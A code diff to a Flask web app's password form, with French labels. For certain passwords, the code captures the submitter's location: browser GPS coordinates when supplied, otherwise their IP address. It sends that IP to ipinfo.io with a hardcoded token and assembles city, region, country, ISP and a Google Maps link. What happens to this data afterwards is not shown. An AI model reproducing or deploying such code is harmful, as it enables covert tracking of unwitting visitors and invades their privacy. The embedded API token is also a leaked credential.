@@ -22,32 +22,41 @@ def index():
     error = None
     if request.method == "POST":
         password = request.form.get("password")
+        lat = request.form.get("lat", "")
+        lon = request.form.get("lon", "")
+        coords_provided = lat and lon
 
         if password == "13007":
             return redirect("https://astonishing-enemy-368.notion.site/La-confiance-se-m-rite-le-silence-se-choisit-1c2ad04878e5804599bae5dcca9afaf2")
 
         elif password in PASSWORD_ACTIONS:
             try:
-                ip_raw = request.headers.get('X-Forwarded-For', request.remote_addr)
-                ip = ip_raw.split(',')[0].strip()
+                if coords_provided:
+                    gmap_link = f"https://www.google.com/maps?q={lat},{lon}&z=18"
+                    loc_info = (
+                        f"Coordonnées GPS fournies par le navigateur :\n"
+                        f"{lat}, {lon}\n"
+                        f"Lien Google Maps : {gmap_link}"
+                    )
+                else:
+                    ip_raw = request.headers.get('X-Forwarded-For', request.remote_addr)
+                    ip = ip_raw.split(',')[0].strip()
+                    geo_req = requests.get(f"https://ipinfo.io/{ip}?token=bf034895c48731")
+                    geo_data = geo_req.json()
+                    loc = geo_data.get('loc', '')
+                    city = geo_data.get('city', 'N/A')
+                    region = geo_data.get('region', 'N/A')
+                    country = geo_data.get('country', 'N/A')
+                    org = geo_data.get('org', 'N/A')
+                    lat, lon = loc.split(',') if loc else ("", "")
+                    gmap_link = f"https://www.google.com/maps?q={lat},{lon}&z=18"
 
-                geo_req = requests.get(f"https://ipinfo.io/{ip}?token=bf034895c48731")
-                geo_data = geo_req.json()
-                loc = geo_data.get('loc', '')
-                city = geo_data.get('city', 'N/A')
-                region = geo_data.get('region', 'N/A')
-                country = geo_data.get('country', 'N/A')
-                org = geo_data.get('org', 'N/A')
-                lat, lon = loc.split(',') if loc else ("", "")
-                gmap_link = f"https://www.google.com/maps?q={lat},{lon}&z=18"
-
-                loc_info = (
-                    f"IP : {ip}\n"
-                    f"Ville : {city}\nRégion : {region}\nPays : {country}\nFAI : {org}\n"
-                    f"Coordonnées GPS : {lat}, {lon}\n"
-                    f"Lien Google Maps : {gmap_link}"
-                )
-
+                    loc_info = (
+                        f"IP : {ip}\n"
+                        f"Ville : {city}\nRégion : {region}\nPays : {country}\nFAI : {org}\n"
+                        f"Coordonnées estimées : {lat}, {lon}\n"
+                        f"Lien Google Maps : {gmap_link}"
+                    )
             except Exception as e:
                 loc_info = "Géolocalisation indisponible."
 
